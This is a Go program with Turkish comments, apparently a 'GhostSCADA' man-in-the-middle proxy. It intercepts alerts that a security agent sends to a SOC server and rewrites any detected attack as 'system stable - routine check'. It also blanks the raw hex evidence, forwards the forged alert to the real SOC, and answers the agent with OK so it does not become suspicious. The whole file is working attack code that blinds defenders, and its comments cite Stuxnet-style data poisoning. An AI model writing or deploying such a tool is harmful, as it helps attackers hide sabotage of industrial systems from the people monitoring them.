package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
)

// Ajan ve Merkez arasındaki orijinal veri şablonu
type ThreatAlert struct {
	AgentID    string `json:"agent_id"`
	AttackerIP string `json:"attacker_ip"`
	AttackType string `json:"attack_type"`
	RawHex     string `json:"raw_hex"`
	Timestamp  string `json:"timestamp"`
}

var (
	c2Server  = "http://127.0.0.1:8080/api/alert" // Gerçek SOC Sunucusu
	proxyPort = "8081"                            // GhostSCADA'nın sahte dinleme portu
)

func main() {
	http.HandleFunc("/api/alert", interceptAndPoison)

	fmt.Println("[☠️] GhostSCADA MitM Proxy Başlatıldı")
	fmt.Printf("[☠️] %s Portundan Ajan Trafiği Bekleniyor...\n", proxyPort)
	fmt.Println("=========================================================")

	// Ajanı kandırıp trafiği kendi üzerimize (8081) çekiyoruz
	http.ListenAndServe("0.0.0.0:"+proxyPort, nil)
}

func interceptAndPoison(w http.ResponseWriter, r *http.Request) {
	var alert ThreatAlert
	err := json.NewDecoder(r.Body).Decode(&alert)
	if err != nil {
		return
	}

	fmt.Printf("\n[+] Ajan Trafiği Havada Yakalandı! Orijinal Veri: %s\n", alert.AttackType)

	// --- STUXNET MANTIĞI: VERİ ZEHİRLENMESİ (DATA POISONING) ---
	// Eğer ajan sabotaj tespit etmişse, SOC ekranına giden veriyi manipüle ediyoruz
	if alert.AttackType != "Sistem Stabil (Sahte Veri)" {
		fmt.Println("[!] Kritik Alarm Tespit Edildi. Ekran Körleştirme Protokolü Başlatılıyor...")
		alert.AttackType = "Sistem Stabil - Rutin Kontrol" // SOC ekranında görünecek sahte mesaj
		alert.RawHex = "000000000000000000"                // SOC uzmanını kandırmak için hex verisini sıfırlıyoruz
	}

	// Zehirlenmiş veriyi tekrar JSON'a çeviriyoruz
	poisonedData, _ := json.Marshal(alert)

	// Sahte veriyi gerçek SOC sunucusuna gönderiyoruz
	resp, err := http.Post(c2Server, "application/json", bytes.NewBuffer(poisonedData))
	if err == nil {
		defer resp.Body.Close()
		fmt.Println("[☠️] Zehirli Paket SOC Sunucusuna Başarıyla Enjekte Edildi!")
		fmt.Println("---------------------------------------------------------")
	}

	// Ajana her şey yolunda mesajı dönüyoruz (Ajan şüphelenmesin diye)
	w.WriteHeader(http.StatusOK)
}
